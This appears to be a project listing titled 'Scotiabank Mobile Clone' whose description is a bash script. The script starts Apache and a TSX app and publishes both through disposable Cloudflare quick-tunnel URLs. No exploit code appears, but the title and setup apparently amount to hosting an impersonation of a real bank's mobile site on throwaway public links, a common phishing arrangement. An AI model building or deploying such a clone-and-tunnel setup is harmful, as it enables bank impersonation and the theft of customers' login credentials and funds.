name: Remix: Remix: Remix: Remix: Remix: Remix: Remix: Scotiabank Mobile Clone
description:
#!/bin/bash

# 1. Start Apache and TSX App in the background
# Ensure Apache is listening on 8080 and TSX on 3000
systemctl start apache2 # or your specific command
nohup npx tsx app.ts --port 3000 > /dev/null 2>&1 &
TSX_PID=$!

echo "🦅 DUAL CLOUDFLARE TUNNELS STARTING..."

# 2. Start Tunnel 1 (Webroot) and capture URL
# We use --http-host-header rewrite to prevent 404/Host errors
cloudflared tunnel --url http://localhost:8080 --http-host-header rewrite > webroot_t.log 2>&1 &
sleep 5
WEB_URL=$(grep -o 'https://[-0-9a-z.]*trycloudflare.com' webroot_t.log | head -n 1)

# 3. Start Tunnel 2 (TSX App) and capture URL
cloudflared tunnel --url http://localhost:3000 --http-host-header rewrite > tsx_t.log 2>&1 &
sleep 5
TSX_URL=$(grep -o 'https://[-0-9a-z.]*trycloudflare.com' tsx_t.log | head -n 1)

# 4. Final Output (Fixed Emojis & Links)
clear
echo "🎉 DUAL TUNNELS LIVE 🎉"
echo "📁 WEBROOT FOLDER (8080): $WEB_URL"
echo "⚡ TSX APP (3000):        $TSX_URL"
echo "PID: $TSX_PID"
